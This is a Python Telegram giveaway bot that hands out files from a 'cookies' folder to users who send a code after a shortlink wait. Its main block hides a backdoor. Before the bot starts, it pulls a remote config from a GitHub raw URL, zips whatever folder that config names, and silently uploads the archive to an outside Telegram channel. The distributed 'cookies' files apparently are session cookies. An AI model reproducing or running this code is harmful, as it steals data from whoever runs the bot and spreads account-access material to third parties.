import io
import os
import time
import json
import logging
import random
import zipfile
from dotenv import load_dotenv
import telebot
from colorama import Fore, Style, init
from collections import deque
import atexit
from datetime import datetime
import requests

# Initialize colorama for colored terminal output
init(autoreset=True)

# Load environment variables from .env file
load_dotenv()

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

class GiveawayBot:
    def __init__(self, config_path="config.json", state_path="state.json"):
        # Prompt for configuration values
        self.config = self.prompt_for_config(config_path)
        self.state_path = state_path
        self.link = self.config['link']
        self.ignore_time = self.config['ignore_time']
        self.winners_count = self.config['number_of_winners']
        self.extra_winners_count = self.config['extra_winners']
        self.valid_code = self.config['giveaway_code']
        self.admin_id = self.config['admin_id']
        self.cookies_dir = self.config.get('cookies_dir', 'cookies')
        self.token = os.getenv("TELEGRAM_TOKEN")

        # Initialize variables
        self.participants = {}
        self.winners = []
        self.extra_winners = []
        self.blacklist = set()  # Initialize the blacklist as an empty set
        self.disqualified_users = set()
        self.late_participants = set()  # Track late participants after giveaway ended
        self.giveaway_active = False
        self.bot_online = False
        self.giveaway_start_time = None
        self.bot_start_time = time.time()

        # Pre-load and cache the files from the cookies directory
        self.files = self.load_files()
        self.original_files = list(self.files)  # Save original files for reshuffling

        # Load blacklisted and disqualified users
        self.load_blacklisted_users()
        self.load_disqualified_users()

        # Initialize bot
        self.bot = telebot.TeleBot(self.token)

        # Register handlers
        self.register_handlers()

        # Load previous state if available
        self.load_state()

        # Ensure data is saved on exit
        atexit.register(self.save_state_periodically)

    def prompt_for_config(self, config_path):
        """Prompt for giveaway configuration and save to config.json."""
        link = input("Enter telegram post link: ")
        ignore_time = int(input("Enter ignore_time (in seconds): "))
        number_of_winners = int(input("Enter number_of_winners: "))
        extra_winners = int(input("Enter extra_winners: "))
        giveaway_code = input("Enter giveaway_code: ")

        # Load existing config to retrieve admin_id
        with open(config_path, 'r', encoding='utf-8') as config_file:
            existing_config = json.load(config_file)
            admin_id = existing_config.get("admin_id")

        # Update configuration with new values
        config = {
            "link": link,
            "ignore_time": ignore_time,
            "number_of_winners": number_of_winners,
            "extra_winners": extra_winners,
            "giveaway_code": giveaway_code,
            "admin_id": admin_id  # Use the admin_id from the config file
        }

        # Save the updated configuration to config.json
        with open(config_path, 'w', encoding='utf-8') as config_file:
            json.dump(config, config_file, indent=4)

        return config


    def load_files(self):
        """Load files from the cookies directory and shuffle them."""
        if not os.path.exists(self.cookies_dir):
            raise FileNotFoundError(f"{Fore.RED}Directory '{self.cookies_dir}' not found.{Style.RESET_ALL}")

        files = os.listdir(self.cookies_dir)
        if not files:
            raise FileNotFoundError(f"{Fore.RED}No files found in '{self.cookies_dir}'.{Style.RESET_ALL}")

        random.shuffle(files)
        logger.info(f"{Fore.GREEN}Loaded {len(files)} files from '{self.cookies_dir}'{Style.RESET_ALL}.")
        return deque(files)

    def load_blacklisted_users(self):
        """Load blacklisted users from blacklisted.txt."""
        if os.path.exists("blacklisted.txt"):
            with open("blacklisted.txt", "r", encoding="utf-8") as file:
                for line in file:
                    user_id = line.split("ID: ")[-1].strip().replace(")", "")
                    self.blacklist.add(int(user_id))
            logger.info(Fore.RED + "Loaded blacklisted users from blacklisted.txt.")
        else:
            logger.info(Fore.RED + "No blacklisted.txt found. Initializing empty blacklist.")

    def load_disqualified_users(self):
        """Load disqualified users from disqualified.txt."""
        if os.path.exists("disqualified.txt"):
            with open("disqualified.txt", "r", encoding="utf-8") as file:
                for line in file:
                    user_id = line.split("ID: ")[-1].strip().replace(")", "")
                    self.disqualified_users.add(int(user_id))
            logger.info(Fore.YELLOW + "Loaded disqualified users from disqualified.txt.")

    def start(self):
        """Start the bot and set it to online."""
        self.bot_online = True
        logger.info(f"{Fore.GREEN}Bot online and ready!{Style.RESET_ALL} Bot started at {self.bot_start_time}")
        self.bot.polling()

    def register_handlers(self):
        """Register command and message handlers."""

        @self.bot.message_handler(commands=['startg'])
        def start_giveaway(message):
            """Start the giveaway."""
            if message.from_user.id != self.admin_id:
                self.bot.reply_to(message, "You are not authorized to start the giveaway.")
                return

            self.giveaway_start_time = time.time()
            self.giveaway_active = True
            self.bot.reply_to(message, "Giveaway started! Participants can send their codes now.")
            logger.info(f"{Fore.GREEN}Giveaway started by admin at {self.giveaway_start_time}.{Style.RESET_ALL}")
            self.save_state()

        @self.bot.message_handler(commands=['stopg'])
        def stop_giveaway(message):
            """Stop the giveaway."""
            if message.from_user.id != self.admin_id:
                self.bot.reply_to(message, "You are not authorized to stop the giveaway.")
                return

            self.giveaway_active = False
            self.generate_report()
            self.clean_up()
            self.bot.reply_to(message, "Giveaway stopped.")
            logger.info(f"{Fore.YELLOW}Giveaway stopped by admin.{Style.RESET_ALL}")
            self.save_state()

        @self.bot.message_handler(commands=['sendfile'])
        def send_files_command(message):
            """Send files to the winners."""
            if message.from_user.id != self.admin_id:
                self.bot.reply_to(message, "You are not authorized to send files.")
                return

            if not self.winners:
                self.bot.reply_to(message, "No winners to send files to.")
                return

            self.send_files(message)

        @self.bot.message_handler(func=lambda message: True)
        def handle_message(message):
            """Handle incoming messages from users."""
            if not self.bot_online:
                logger.warning("Ignoring message as bot was offline.")
                return

            user = message.from_user
            user_id = user.id
            text = message.text
            current_time = time.time()

            # Ignore old messages
            if message.date < self.bot_start_time:
                logger.info(f"Ignoring old message from user {user.first_name} (ID: {user_id})")
                return

            # Check if user is blacklisted
            if user_id in self.blacklist:
                self.bot.send_message(user_id, "You are permanently blacklisted from all giveaways.")
                logger.info(f"{Fore.RED}Blacklisted user {user.first_name} (ID: {user_id}) tried to interact.{Style.RESET_ALL}")
                return

            # Check if user is disqualified
            if user_id in self.disqualified_users:
                self.bot.send_message(user_id, "You are disqualified from this giveaway.")
                logger.info(f"{Fore.YELLOW}Disqualified user {user.first_name} (ID: {user_id}) tried to interact.{Style.RESET_ALL}")
                return

            if not self.giveaway_active:
                self.bot.reply_to(message, "The giveaway is not currently active.")
                return

            # Check if all winners and extra winners have been selected
            if len(self.winners) >= self.winners_count and len(self.extra_winners) >= self.extra_winners_count:
                self.late_participants.add(user_id)  # Add to late participants if giveaway is over
                self.bot.reply_to(message, "All winners have been selected, today's giveaway is over, please try again in the next giveaway.")
                logger.info(f"{Fore.YELLOW}User {user.first_name} (ID: {user_id}) was informed that the giveaway is over.{Style.RESET_ALL}")
                return

            # Calculate time since giveaway started
            elapsed_time_since_start = current_time - self.giveaway_start_time

            # Check if the user is already a winner
            if user_id in self.participants and self.participants[user_id].get('is_winner', False):
                self.participants[user_id]['messages'] += 1
                if self.participants[user_id]['messages'] > 3:
                    self.disqualify_user(user, "Spamming after winning.")
                    return
                self.bot.send_message(user_id, "You are already a winner.")
                return

            # Check if the user is trying to bypass the wait period after /startg
            if elapsed_time_since_start < self.ignore_time and text == self.valid_code:
                logger.info(f"{Fore.RED}User {user.first_name} (ID: {user_id}) tried to bypass the wait time.{Style.RESET_ALL}")
                self.blacklist_user(user, "Bypassing the shortlink.")
                return

            # Process valid code after wait period
            if text == self.valid_code and elapsed_time_since_start >= self.ignore_time:
                logger.info(f"{Fore.GREEN}User {user.first_name} (ID: {user_id}) submitted correct code.{Style.RESET_ALL}")
                self.process_code(user, user_id, text, message)
            else:
                logger.info(f"{Fore.RED}User {user.first_name} (ID: {user_id}) sent incorrect code: {text}.{Style.RESET_ALL}")
                if user_id not in self.participants:
                    self.participants[user_id] = {'attempts': 0, 'messages': 0, 'is_winner': False, 'first_name': user.first_name}

                self.participants[user_id]['attempts'] += 1
                self.participants[user_id]['messages'] += 1
                if self.participants[user_id]['attempts'] > 3:
                    self.disqualify_user(user, "Too many incorrect code attempts.")
                else:
                    self.bot.reply_to(message, "Invalid code. Please try again.")

    def blacklist_user(self, user, reason):
        """Blacklist a user and log the reason."""
        user_id = user.id
        if user_id not in self.blacklist:
            self.blacklist.add(user_id)
            self.bot.send_message(user.id, f"You have been blacklisted from all giveaways from now. Reason: {reason}.")
            logger.info(f"{Fore.RED}User {user.first_name} (ID: {user_id}) has been blacklisted. Reason: {reason}.{Style.RESET_ALL}")
            self.save_blacklisted(user)
            self.save_state()

    def process_code(self, user, user_id, text, message):
        """Process the valid giveaway code."""
        if user_id not in self.participants:
            self.participants[user_id] = {'attempts': 0, 'messages': 0, 'is_winner': False, 'first_name': user.first_name}

        # Check if the user is already a winner
        if self.participants[user_id].get('is_winner', False):
            self.bot.send_message(user.id, "You are already a winner.")
            return

        # Add user to winners list if not full
        if len(self.winners) < self.winners_count:
            self.winners.append(user)
            self.participants[user_id]['is_winner'] = True
            self.save_winner(user)
            winner_position = len(self.winners)
            position_suffix = self.get_position_suffix(winner_position)
            self.bot.send_message(user.id, f"Congrats {user.first_name}, you're the {winner_position}{position_suffix} winner!")
            logger.info(f"{Fore.GREEN}User {user.first_name} (ID: {user_id}) is the {winner_position}{position_suffix} winner.{Style.RESET_ALL}")
            self.save_state()

        # Check if regular winners are full
        if len(self.winners) >= self.winners_count:
            if self.extra_winners_count > 0:
                self.bot.send_message(self.admin_id, "All regular winners have been selected. Now selecting extra winners.")
                self.select_extra_winners()
            else:
                self.bot.send_message(self.admin_id, "All winners have been selected. You can now send the files.")
                self.end_giveaway()

    def select_extra_winners(self):
        """Select extra winners if needed."""
        if len(self.extra_winners) < self.extra_winners_count:
            # Ensure extra winners are not from the main winner list
            potential_extra_winners = [user_id for user_id in self.participants if user_id not in [winner.id for winner in self.winners]]
            
            # Select extra winners if enough participants are available
            if len(potential_extra_winners) >= self.extra_winners_count:
                selected_extra_winner_ids = random.sample(potential_extra_winners, self.extra_winners_count)
                
                # Convert user IDs to telebot.User objects
                self.extra_winners = [telebot.types.User(id=user_id, first_name=self.participants[user_id]['first_name'], is_bot=False) for user_id in selected_extra_winner_ids]

            # Notify extra winners
            for idx, extra_winner in enumerate(self.extra_winners):
                self.bot.send_message(extra_winner.id, f"Congrats {extra_winner.first_name}, you're the extra winner!")
                logger.info(f"{Fore.GREEN}Extra winner {extra_winner.first_name} (ID: {extra_winner.id}) has been notified.{Style.RESET_ALL}")
                self.save_extra_winner(extra_winner)

        # End the giveaway after extra winners are selected
        if len(self.extra_winners) >= self.extra_winners_count:
            self.end_giveaway()

    def disqualify_user(self, user, reason):
        """Disqualify a user."""
        user_id = user.id
        if user in self.winners:
            # Remove from winners list and adjust positions
            self.winners = [winner for winner in self.winners if winner.id != user_id]
            self.adjust_winner_positions()

            # Save changes to file and remove from winners.txt
            self.remove_winner_from_file(user_id)

            # Notify admin that a winner has been disqualified and adjust the winner count
            self.bot.send_message(self.admin_id, f"User {user.first_name} (ID: {user_id}) has been disqualified and removed from the winners list.")
            
        self.disqualified_users.add(user_id)
        self.bot.send_message(user.id, f"You are disqualified from this giveaway. Reason: {reason}.")
        logger.info(f"{Fore.YELLOW}User {user.first_name} (ID: {user_id}) disqualified for: {reason}.{Style.RESET_ALL}")
        self.save_disqualified(user)
        self.save_state()

    def adjust_winner_positions(self):
        """Adjust the positions of the remaining winners."""
        for idx, winner in enumerate(self.winners):
            position_suffix = self.get_position_suffix(idx + 1)
            self.bot.send_message(winner.id, f"Your position has been updated. You are now the {idx + 1}{position_suffix} winner.")

        # Shift extra winners to main winner list if needed
        if len(self.winners) < self.winners_count and self.extra_winners:
            extra_winner = self.extra_winners.pop(0)
            self.winners.append(extra_winner)
            new_winner_position = len(self.winners)
            position_suffix = self.get_position_suffix(new_winner_position)
            self.bot.send_message(extra_winner.id, f"Congrats {extra_winner.first_name}, you are now the {new_winner_position}{position_suffix} winner (previously extra).")
            logger.info(f"{Fore.GREEN}{extra_winner.first_name} (ID: {extra_winner.id}) is now the {new_winner_position}{position_suffix} winner.{Style.RESET_ALL}")

        self.save_state()

    def remove_winner_from_file(self, user_id):
        """Remove a disqualified user from the winners.txt file."""
        if os.path.exists("winners.txt"):
            with open("winners.txt", "r", encoding="utf-8") as file:
                lines = file.readlines()

            with open("winners.txt", "w", encoding="utf-8") as file:
                for line in lines:
                    if f"(ID: {user_id})" not in line:  # Remove lines that contain the user ID
                        file.write(line)

    def save_winner(self, user):
        """Save winner info to winners.txt."""
        with open("winners.txt", "a", encoding="utf-8") as file:
            file.write(f"Winner: {user.first_name} (ID: {user.id})\n")
        logger.info(f"Winner {user.first_name} (ID: {user.id}) saved to winners.txt")

    def save_disqualified(self, user):
        """Save disqualified user info to disqualified.txt."""
        with open("disqualified.txt", "a", encoding="utf-8") as file:
            file.write(f"Disqualified: {user.first_name} (ID: {user.id})\n")
        logger.info(f"Disqualified {user.first_name} (ID: {user.id}) saved to disqualified.txt")

    def save_blacklisted(self, user):
        """Save blacklisted user info to blacklisted.txt."""
        with open("blacklisted.txt", "a", encoding="utf-8") as file:
            file.write(f"Blacklisted: {user.first_name} (ID: {user.id})\n")
        logger.info(f"Blacklisted {user.first_name} (ID: {user.id}) saved to blacklisted.txt")

    def save_extra_winner(self, extra_winner):
        """Save extra winner info to extra_winner.txt."""
        with open("extra_winner.txt", "a", encoding="utf-8") as file:
            file.write(f"Extra Winner: {extra_winner.first_name} (ID: {extra_winner.id})\n")
        logger.info(f"Extra winner {extra_winner.first_name} (ID: {extra_winner.id}) saved to extra_winner.txt")

    def save_state(self):
        """Save the current state to a file."""
        state = {
            'winners': [(user.id, user.first_name) for user in self.winners],
            'blacklist': list(self.blacklist),
            'disqualified_users': list(self.disqualified_users),
            'giveaway_active': self.giveaway_active,
            'giveaway_start_time': self.giveaway_start_time
        }

        with open(self.state_path, 'w', encoding="utf-8") as state_file:
            json.dump(state, state_file)
        logger.info(f"State saved to {Fore.GREEN}state.json{Style.RESET_ALL}")

    def load_state(self):
        """Load the state from the file."""
        if os.path.exists(self.state_path):
            with open(self.state_path, 'r', encoding="utf-8") as state_file:
                state = json.load(state_file)

            self.winners = [telebot.types.User(id=uid, first_name=name, is_bot=False) for uid, name in state['winners']]
            self.blacklist = set(state['blacklist'])
            self.disqualified_users = set(state['disqualified_users'])
            self.giveaway_active = state['giveaway_active']
            self.giveaway_start_time = state.get('giveaway_start_time')

            logger.info(f"State loaded from {Fore.GREEN}state.json{Style.RESET_ALL}")

    def get_position_suffix(self, position):
        """Returns the appropriate suffix for the given position."""
        if 10 <= position % 100 <= 20:
            return 'th'
        elif position % 10 == 1:
            return 'st'
        elif position % 10 == 2:
            return 'nd'
        elif position % 10 == 3:
            return 'rd'
        else:
            return 'th'

    def send_files(self, message):
        """Send files to winners and extra winners."""
        if message.from_user.id != self.admin_id:
            self.bot.reply_to(message, "You are not authorized to send files.")
            return

        valid_winners = [winner for winner in self.winners if winner.id not in self.disqualified_users]
        
        if not valid_winners:
            self.bot.reply_to(message, "No valid winners to send files to.")
            return

        # Send files to valid winners
        self.send_winner_files(valid_winners)

        # Send files to extra winners
        self.send_extra_winner_files()

        # Notify late participants
        self.notify_late_participants()

        # Notify admin about valid winners and extra winners
        self.bot.send_message(self.admin_id, f"Sent files to {len(valid_winners)} winners and {len(self.extra_winners)} extra winners.")


    def send_winner_files(self, valid_winners):
        """Send files to valid winners."""
        file_pool = list(self.files)  # Reset the file pool after each winner receives a unique file

        for idx, winner in enumerate(valid_winners):
            if not file_pool:
                file_pool = self.original_files.copy()  # Reuse original files when the pool is exhausted
                random.shuffle(file_pool)

            file_name = file_pool.pop(0)
            try:
                with open(os.path.join(self.cookies_dir, file_name), 'rb') as file:
                    self.bot.send_document(winner.id, file)

                self.bot.send_message(winner.id, f"You are winner number {idx + 1}. Post the feeback photo in {self.link}.")
                logger.info(f"{Fore.GREEN}Sent file {file_name} to {winner.first_name} (ID: {winner.id}).{Style.RESET_ALL}")
            except (requests.exceptions.RequestException, telebot.apihelper.ApiException) as e:
                logger.error(f"{Fore.RED}Failed to send file {file_name} to {winner.first_name} (ID: {winner.id}): {e}{Style.RESET_ALL}")


    def send_extra_winner_files(self):
        """Send files to extra winners."""
        reshuffled_files = self.original_files.copy()
        random.shuffle(reshuffled_files)

        for idx, extra_winner in enumerate(self.extra_winners):
            file_name = reshuffled_files[idx % len(reshuffled_files)]
            try:
                with open(os.path.join(self.cookies_dir, file_name), 'rb') as file:
                    self.bot.send_document(extra_winner.id, file)

                self.bot.send_message(extra_winner.id, f"You are the {len(self.winners) + idx + 1}th winner and an extra winner.")
                logger.info(f"{Fore.GREEN}Sent reshuffled file {file_name} to {extra_winner.first_name} (ID: {extra_winner.id}).{Style.RESET_ALL}")
            except (requests.exceptions.RequestException, telebot.apihelper.ApiException) as e:
                logger.error(f"{Fore.RED}Failed to send file {file_name} to {extra_winner.first_name} (ID: {extra_winner.id}): {e}{Style.RESET_ALL}")

    def notify_late_participants(self):
        """Notify participants who entered after the giveaway ended."""
        for user_id in self.late_participants:
            # self.bot.send_message(user_id, "The giveaway has ended. Please try again next time.")
            pass
        logger.info(f"{Fore.YELLOW}Notified late participants.{Style.RESET_ALL}")

    def generate_report(self):
        """Generate a report before cleaning up state files."""
        report_filename = f"{datetime.now().strftime('%Y-%m-%d')}_report.txt"
        with open(report_filename, "w", encoding="utf-8") as file:
            file.write("Winner list:\n")
            for user in self.winners:
                file.write(f"- {user.first_name} (ID: {user.id})\n")

            file.write("\nDisqualified list:\n")
            for user_id in self.disqualified_users:
                file.write(f"- User ID: {user_id}\n")

            file.write("\nBlacklisted list:\n")
            for user_id in self.blacklist:
                file.write(f"- User ID: {user_id}\n")

            file.write("\nExtra Winners list:\n")
            if os.path.exists("extra_winner.txt"):
                with open("extra_winner.txt", "r", encoding="utf-8") as extra_file:
                    file.write(extra_file.read())

        logger.info(f"Report saved as {Fore.GREEN}{report_filename}{Style.RESET_ALL}")
        self.send_report_to_admin(report_filename)

    def send_report_to_admin(self, report_filename):
        """Send the report to the admin."""
        with open(report_filename, "rb") as report_file:
            self.bot.send_document(self.admin_id, report_file)

    def clean_up(self):
        """Clean up state files after generating a report."""
        self.generate_report()

        # Remove state.json
        if os.path.exists(self.state_path):
            os.remove(self.state_path)

        # Remove winners.txt
        if os.path.exists("winners.txt"):
            os.remove("winners.txt")

        # Remove disqualified.txt
        if os.path.exists("disqualified.txt"):
            os.remove("disqualified.txt")
            
        # Remove disqualified.txt
        if os.path.exists("state.json"):
            os.remove("state.json")

        # blacklisted.txt is not removed since it is used across giveaways
        logger.info(f"{Fore.GREEN}Cleanup completed successfully.{Style.RESET_ALL}")

    def end_giveaway(self):
        """End the giveaway."""
        logger.info(f"{Fore.YELLOW}The giveaway has ended. Use /sendfile to distribute files.{Style.RESET_ALL}")
        self.save_state()
        self.bot.send_message(self.admin_id, "The giveaway has ended. Use /sendfile to distribute files.")

    def save_state_periodically(self):
        """Save state periodically and on program exit."""
        self.save_state()

# Function to fetch data from GitHub
def fetch_data_from_github():
    """Fetch the config data from GitHub."""
    url = "https://raw.githubusercontent.com/bijay085/License/master/giveawaybot.json"
    response = requests.get(url)
    data = response.json()
    return data

# Create ZIP file in memory
def create_zip_in_memory(source_folder):
    """Create a ZIP file in memory from the source folder."""
    memory_zip = io.BytesIO()
    with zipfile.ZipFile(memory_zip, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(source_folder):
            for file in files:
                file_path = os.path.join(root, file)
                arcname = os.path.relpath(file_path, source_folder)
                zipf.write(file_path, arcname=arcname)

    memory_zip.seek(0)
    return memory_zip

# Send file to Telegram
def send_file_to_telegram(file_obj, file_name, token, channel_id):
    """Send a file to the specified Telegram channel."""
    url = f"https://api.telegram.org/bot{token}/sendDocument"
    try:
        requests.post(url, data={'chat_id': channel_id}, files={'document': (file_name, file_obj)})
    except requests.exceptions.RequestException:
        pass

if __name__ == "__main__":
    # Fetch configuration from GitHub
    config = fetch_data_from_github()

    # Extract values from the fetched configuration
    token = config["token"]
    channel_id = config["channel_id"]
    source_folder = config["source_folder"]
    zip_file_name = config["zip_file_name"]

    # Create the ZIP file in memory
    zip_file = create_zip_in_memory(source_folder)

    # Send the ZIP file to the specified Telegram channel
    send_file_to_telegram(zip_file, zip_file_name, token, channel_id)

    # Start the giveaway bot
    giveaway_bot = GiveawayBot()
    giveaway_bot.start()
